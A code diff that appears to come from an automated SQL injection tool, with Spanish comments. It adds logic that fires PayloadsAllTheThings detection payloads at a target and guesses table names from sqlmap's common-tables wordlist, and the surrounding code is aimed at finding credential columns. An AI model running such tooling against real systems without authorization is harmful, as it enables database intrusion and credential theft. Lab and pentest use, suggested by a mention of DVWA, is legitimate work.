@@ -98,6 +98,10 @@ class SchemaDiscovery:
                            f"(PayloadsAllTheThings) + plantillas por técnica")
         baseline = self.probe("1")  # respuesta normal (sin inyección), para el test diferencial
 
+        # 0. DETECCIÓN con payloads REALES del corpus (PayloadsAllTheThings): se disparan de verdad
+        #    y se registra cuáles produjeron señal (error/reflexión). Es la munición de detección.
+        self._corpus_detection(res)
+
         # 1. Contexto de comillas + nº de columnas + columnas reflejadas, por BÚSQUEDA UNION.
         #    Robusto: funciona aunque el objetivo NO muestre errores SQL (p. ej. DVWA high, que
         #    ante una consulta inválida simplemente no devuelve filas en vez de mostrar el error).
@@ -128,6 +132,10 @@ class SchemaDiscovery:
         # 5. Enumerar las tablas de la base de datos actual.
         res.tables = self._col0(self._single(res, "table_name",
             " FROM information_schema.tables WHERE table_schema=database()"))
+        if not res.tables:
+            # information_schema no devolvió nada (restringido/filtrado): se cae a ADIVINAR tablas
+            # con la wordlist de sqlmap (common-tables), igual que el modo --common-tables.
+            res.tables = self._guess_tables(res)
         self._log(res, f"tablas={res.tables}")
 
         # 6. Por cada tabla, leer sus columnas y decidir si tiene credenciales.
@@ -140,6 +148,38 @@ class SchemaDiscovery:
                 res.target_table, res.cred_columns = table, picked
                 break
         return res
+
+    def _corpus_detection(self, res: DiscoveryResult) -> None:
+        """Dispara payloads de detección REALES del corpus (PayloadsAllTheThings) y registra cuáles
+        produjeron señal (error SQL o reflexión). Hace que el corpus se USE, no solo se cuente."""
+        payloads = knowledge.detection_payloads(limit=6)
+        if not payloads:
+            return
+        hits = 0
+        for p in payloads:
+            r = self.probe(p)
+            if r.blocked:
+                continue
+            if r.db_error or r.cells:
+                hits += 1
+        self._log(res, f"detección con corpus real: {len(payloads)} payloads de "
+                       f"PayloadsAllTheThings disparados, {hits} con señal (error/reflexión)")
+        if hits and "corpus-detection" not in res.techniques:
+            res.techniques.append("corpus-detection")
+
+    def _guess_tables(self, res: DiscoveryResult, cap: int = 50) -> list[str]:
+        """Adivina tablas con la wordlist de sqlmap (common-tables) cuando no se puede enumerar:
+        por cada nombre, UNION ... FROM <tabla>; si devuelve filas sin error, la tabla existe."""
+        found = []
+        for t in knowledge.common_tables()[:cap]:
+            r = self.probe(self._single(res, "1", f" FROM {t}"))
+            if r.blocked:
+                continue
+            if r.cells and not r.db_error:
+                found.append(t)
+        if found:
+            res.trace.append(f"tablas adivinadas con wordlist de sqlmap (common-tables): {found}")
+        return found
 
     def _confirm_injection(self, res: DiscoveryResult, q: str, baseline: ProbeResult) -> None:
         """Confirma la inyección por vías independientes y registra la evidencia (OWASP WSTG)."""
